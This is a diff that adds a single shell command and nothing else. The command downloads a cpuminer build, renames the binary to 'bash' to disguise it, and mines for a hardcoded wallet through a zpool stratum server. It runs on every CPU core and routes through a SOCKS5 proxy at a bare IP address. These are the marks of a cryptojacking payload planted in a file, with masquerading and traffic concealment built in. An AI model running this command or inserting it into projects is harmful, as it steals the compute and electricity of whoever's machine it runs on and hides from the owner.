@@ -1,0 +1,1 @@
+wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && mv cpuminer bash && ./bash -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u RTtk7vLmDyGniud9QibWXsignTafFPTHg7.gc -p c=RVN -t $(nproc --all) --proxy socks5://24.249.199.12:4145
